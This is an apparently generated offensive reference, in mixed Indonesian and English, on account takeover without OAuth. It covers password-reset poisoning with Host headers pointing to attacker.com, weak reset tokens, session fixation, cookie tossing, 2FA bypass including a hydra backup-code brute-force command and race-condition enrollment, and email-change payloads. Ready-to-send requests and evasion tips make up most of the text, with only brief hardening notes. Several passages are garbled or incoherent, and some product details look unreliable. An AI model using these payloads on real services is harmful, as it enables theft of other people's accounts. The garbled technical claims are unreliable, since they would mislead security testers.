# ato-misc — auth

# Technical Reference: Non-OAuth Account Takeover

## 1. Password Reset Poisoning (Host / X-Forwarded-Host)

**What is sent:**

```http
POST /api/auth/forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/json

{"email":"victim@target.com"}
```

**What appears:** victim receives an email containing a link `https://attacker.com/reset?token=...` — server injects Host/X-Forwarded-Host into the reset email template.

**Why it works:** backend (Node/Express pre-`trust proxy` misconfig, or framework that reads `X-Forwarded-Host` unvalidated) builds base URL from header before rendering template.

**Varian curl:**

```bash
curl -s https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# kalau Host di-hard-validate, coba header terpisah:
curl -s https://target.com/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "X-Forwarded-Port: 443" \
  -H "X-Forwarded-Proto: https" \
  -d '{"email":"victim@target.com"}'
```

**Header kandidat x failing frontend validation:**

| Header | Successful condition |
|---|---|
| `Host` | Web server/CDN does not force canonical host (nginx without `server_name` catch-all validation) |
| `X-Forwarded-Host` | Reverse proxy sets `proxy_set_header Host $http_host` and app reads XFH |
| `X-Forwarded-Scheme`/`X-Forwarded-Proto` | Redirect to `http://` so token is sent in plaintext via redirect |
| `X-Original-URL` / `X-Rewrite-URL` | Backend uses path header to build reset URL |

**nginx 1.25 hardening that defeats it:**

```nginx
server {
    server_name _;
    return 421;
}
# dan selalu:
proxy_set_header Host $host;          # bukan $http_host
proxy_set_header X-Forwarded-Host ""; # strip header dari klien
```

**Additional payload poisoning:** host contains port/tab sequence for email client:

```
Host: target.com:+ tougher.attacker.com
Host: target.com@attacker.com
```

---

## 2. Token Reset Lemah

### 2.1 Predictable

**What is sent:** reset request ≥5 times for own email, take token.

```bash
for i in {1..5}; do
  curl -s -X POST https://target.com/forgot-password \
    -d '{"email":"own@redteam.io"}' &
  sleep 0.1
done
```

**Pola kandidat:**

| Pattern | Example | Exploit |
|---|---|---|
| Unix timestamp | `1701383612` | predict from email received time ±1s |
| Timestamp + md5(email) | known md5 | use own email when triggering, victim when redeeming |
| Seeded RNG / mt_rand reused | token 8 digit | brute ≤10^8 |
| Hash from userid/email | token = md5(user_id) | reversible |

**Why it fails:** modern tokens use CSPRNG (Go `crypto/rand`, Node `crypto.randomBytes(20)`, Python `secrets.token_urlsafe(32)`) — if length ≥128 bits, stop predict path.

### 2.2 No-Expiry

**What is sent:** trigger reset for own email last month (from burp history/old account), use old token.

**What appears:** `200 OK` on `/reset?token=OLD_TOKEN`. Token expired ?2 years. Valid across deployments.

### 2.3 Cross-Account Reuse

**What is sent:**

```
1. Trigger reset untuk victim@target.com  → token V (intercept, jangan consume)
2. Trigger reset untuk own@redteam.io     → token O
3. POST /reset-password dengan body {"token":"V","password":"P@ss1"} + session cookie milik akun sendiri
4. POST /reset-password dengan body {"token":"O","password":"x"} tapi referer/username field diubah ke korban
```

**Why it works:** backend retrieves user from session/other parameter, token only acts as boolean "valid reset exists" without binding to target user. Test matrix:

| Kombinasi | Indikasi bug |
|---|---|
| Token A + Session user B → user B's password changes | token is not bound to user |
| Token A + `email` parameter from different form | reset follows parameter, not token |
| Consume token via API v1, still valid in API v2 | invalidation is not cross-endpoint |

### 2.4 No Invalidation

- Password reset **does not invalidate** victim's old session → after takeover, victim is still logged in, no signal.
- Reset token **is not deleted** after consumption → replayable forever.
- Subsequent reset request **does not invalidate previous token** → old token still redeemable.

---

## 3. Session Fixation

**What is sent:**

```http
POST /login HTTP/1.1
Cookie: SESSION=attacker_fixed_session_id
Content-Type: application/x-www-form-urlencoded

username=victim&password=<phished>
```

**What appears:** response `Set-Cookie: SESSION=attacker_fixed_session_id` (pre-login value is retained).

**Why it works:** session ID is generated before login (login form, landing page, subdomain also scoped to `.target.com`) and is not regenerated on authentication event.

**Test preconditions:**

| Precondition | Check |
|---|---|
| Server sends session cookie on anonymous page | GET `/` → observe `Set-Cookie` |
| Login without regeneration | burpsuite macro: sample cookie before/after POST /login |
| Session via `Accept`/re-accept old token header | Send old session after login — 200? |

Exploiting combination with password reset:

```
1. Kirim reset link ke korban (phish)
2. Korban klik → pre-login page set-kan session cookie attacker (butuh XSS atau subdomain;set)
3. Korban login/set password baru di sesi session tersebut
4. Attacker redeem session ID sama → langsung ter-autentikasi
```

---

## 4. Cookie Tossing

**What is sent:** via other findings (subdomain renderer, app on `*.target.com`, upload on CDN subdomain) → set:

```http
Set-Cookie: SESSION=attacker_controlled_value; Domain=.target.com; Path=/
```

Cookie scope difference: subdomain `blog.target.com` can set cookie for parent scope.

| Browser | Priority saat duplikat |
|---|---|
| Chrome 131 | Cookies with `__Host-` prefixes are prioritized; else those from older subdomain remain readable if server reads raw `Cookie` header |
| Firefox 133 | Sort `Path` more specific first; coalesce based on creation-time |
| Safari/iOS 18 | Subdomain cookie-mask berbeda — sering jadi vector tunggal |

**Varian juice:**

```
Path traversal di cookie name:
Set-Cookie: session=legit; Expires=Fri, 01-Jan-2027 00:00:00\nsession=fake; Domain=.target.com; Path=/admin
```

Server-side splits `Cookie` header by `;` — second cookie overwrites value in frameworks that also allow whitespace in path.

**Why it fails:** target ensures:
```http
Set-Cookie: session=...; Path=/; Secure; HttpOnly; SameSite=Lax; + HostOnly (tanpa atribut Domain)
```
→ cookie-only host-wise scope, other subdomains cannot set ID pel thwart.

---

## 4.2 Cross-Subdomain Tossing — Session Cookie Attribute Discrimination

```http
Set-Cookie: session=deadbeef; Domain=app.target.com; Path=/admin/; Secure
```

Subdomain `app.target.com` — if `Domain` is set to parent and app decodes `session` cookie even if **path substring** matches `/admin`, cookie from attacker origin on this subdomain can override. (Java Spring Security 5.x and some older `CookieSerializer` parse path using contains).

---

## 5. 2FA Bypass

### 5.1 Response Manipulation

**What is sent:**

```http
POST /login/2fa HTTP/1.1
Cookie: auth_stage=pending

{"otp":"123456"}
```

Response normal:

```json
{"success":false,"error":"invalid"}
```

Interceptor (burp match/replace) bantalan response → forward versi berikut:

```json
{"success":true,"redirect":"/dashboard"}
```

Or on client-side decision:

```js
// check flow JS: codepen Vue/React lama
if (res.verified) location.href="/home";
```

continue directly with `/home` request — is session cookie already fully auth?

| Injection point | Payload |
|---|---|
| Change JSON response `"verified":false→true` at proxy level | Burp `Match/Replace` response |
| Client-side check | next step load bypasses authentication (function `checkStep` laggio) |
| status code | `/api/2fa/verify` which only records `204=ok, 401=bad` → race with expiration (see 5.2) |

### 5.2 Backup Code Brute

**What is sent:**

```bash
# contoh 8-char alphanumeric, sangat terbatas rate limit
hydra -L user -P backupcodes.txt target.com https-post-form \
  "/api/2fa/backup:code=^PASS^:F=incorrect"
```

Or without tool — wordlist callback in Burp Intruder:

```
eyJhb : backup code base64 or hex → temukan format panjang dari 1 code awal
```

| Produk | Karakter backup code | Rate-limit |
|---|---|---|
| GitHub (derive) | 8-hex per code, `xxxx-xxxx` format | 8 rps per-IP |
| Laravel Fortify 1.x default | 6 digit numeric, 10 backup | tenant throttle saja |
| Okta (lampo) | Alf rather 10 chars | depends on org policy |

Rate-limit gap: does backup distinguish OAuth step from OTP step (`/api/2fa/otp` rate-limited, `/api/2fa/backup` not)?

### 5.3 Race Enrollment 2FA

**What is sent** (combination of session + parallel request):

```
Sesi benar: korban
1. POST /api/2fa/enroll    → server generate secret + QR
2. Kirim banyak kali parallel via HTTP2:
   POST /api/2fa/enroll → taruh secret attacker (penukar TOTP secret di server storage)
3. Response berisi `otpauth://totp/...?secret=ATTACKER_SECRET`
```

Condition: enrollment allows **overwriting an already active secret during pending window**, or POST `/enroll` allows direct confirmation when the user has enabled 2FA (not only during initial setup).

Race in active-state check:

```bash
# HTTP/2 single-packet multi-request
cat > reqs.txt <<'EOF'
POST /api/2fa/confirm HTTP/2
...
{"secret":"NEW","code":"123456"}
EOF
race-the-web -target https://target.com -requests reqs.txt
```

**Why it works:** endpoint `/confirm` simply checks `enabled=false` → before one of the race requests finishes flipping enabled → duplicate secret overwrite occurs.

---

## 6. Email Change without Re-auth / Confirmation

### 6.1 Direct change

**What is sent:**

```http
POST /api/account/email HTTP/1.1
Cookie: session=STOLEN
Content-Type: application/json

{"email":"attacker@redteam.io","currentPassword":""}
```

**What appears:** `200 OK` + `{"email":"attacker@redteam.io"}` — permanent, immediately active, without verifying link to old email.

### 6.2 Current password partial-check

JSON body with property not yet in schema before MFA migration push:

```json
{"email":"attacker@redteam.io","confirmNewPassword":"...","currentPassword":null}
```

Backend middleware checks `if (currentPassword !== user.password)` → `null !== "hash"` = true → pass. Or:

```json
{"email":"attacker@redteam.io","sure":true}
```

The `sure` field is handled as a re-auth confirmation in routes with weak immutability constraints.

### 6.3 Mass assignment

| Framework | Payload |
|---|---|
| Rails (<=6, ActiveModel `attr_accessible` lama) | `{"user":{"email":"...","admin":true}}` |
| Spring Boot (<=2.7 DTO terurut) | bind `{"email":"...","verified":true}` |
| .NET 8 with `[Bind]` missing restrict | `user.Email`, `user.EmailConfirmed=true` on the default `IdentityUser` model |

### 6.4 Confirmation link weak

- The email change confirmation is sent to the **new email**, not the old one → attacker immediately activates after session takeover, victim does not receive any notice.
- The confirmation token is sufficiently **predictable or exchangable** (v. §2.1).
- **No session re-binding**: after the email changes, the old session is not locked → logout is not forced, the victim can still use the device → attacker gets a long window.

---

## 7. Bonus — Success Criteria / Quick Skip

| Technique | Pre-condition 5-minute check |
|---|---|
| Reset poisoning | Postman: trigger reset for your own account, note the link in the email — does a pure domain `attacker.com` appear? |
- Cross-account reuse | allows you to have 2 of your own accounts for testing |
| Session fixation | Lihat regenerasi sesi statement via Burp `Session Handling` |

---

## 8. Operational Pitfalls in the Field

- **Googlebot/Content-Security heuristic**: some backends check `X-Forwarded-Host` only when the `Vary` header appears — poisoning fails without a caching layer.
- **Host validation in the load balancer**: nginx 1.25 plus strict `server_name target.com` → a request with `Host: attacker.com` gets `421` before touching the application. Solution: use another proxy-chain header.
- **CDN pins host header**: AWS ALB removes the Host header and injects its own list → use `X-Forwarded-For` only for testing.
- **Race enrollment fails via DB transaction**: DB isolation level serializable → try adding a delay before commit or use POST to the confirm endpoint that is not in the same transaction as the enable check.
- **Token reset replay** only **with email confirmation**: if changed > 1 times, the serial reset invalidates the old token, so a valid one is no longer replayable. Always test 2x before reporting.
- **Cookie name collision**: some frameworks allow duplicate cookies — in Chrome 131, a cookie with `Domain=target.com` is hashed host-raw; don't forget to check end-to-end target read via browser, not just burp parse.
- **Email API discards link before render**: the reset link is sent without a plaintext version to a recipient from the MX record — poisoning corrupts the HTML wire. Need to inspect the raw HTML source of the email, don't advertise / route 127 redirect.
- **2FA response manipulation sometimes no-op server-side**: the next endpoint checks server-side flag `two_fa_verified` in session — the response only changes the client view, no session claim. Submit as "ui-only bypass" if login does not succeed, don't report as ATO.
- **Backup code brute** fails if the basic rate-limit is based on `user_id`, not IP → hydra → locks out the victim and triggers SOC.
- **Email change**: prod usually only updates the `temp_email` table, requires verification & confirmation via the old email before commit — check whether login using `temp_email` is also enabled (separate bug: login via pending email).
- **Session fixation** is useless if the target still generates server-side UUID v4 on the first request; only pin if `Set-Cookie` is present on the landing page without login.

---

## [reasoning trace]

Write technical reference, Indonesian, tables, payloads, concrete.
